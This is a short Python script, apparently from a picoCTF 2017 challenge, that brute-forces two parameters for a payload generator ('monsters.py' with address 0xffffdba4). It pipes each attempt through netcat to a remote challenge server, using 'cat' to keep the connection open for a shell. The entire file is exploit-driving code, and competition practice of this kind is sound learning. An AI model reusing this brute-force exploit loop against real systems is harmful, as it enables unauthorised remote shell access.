import sys
import os

for i in range(0x9, 0xb):
    for j in range(0xfa, 0xfd):
        os.system("(python monsters.py 0xffffdba4 " + str(i) + " " + str(j)  + "; cat) | nc shell2017.picoctf.com 4463")
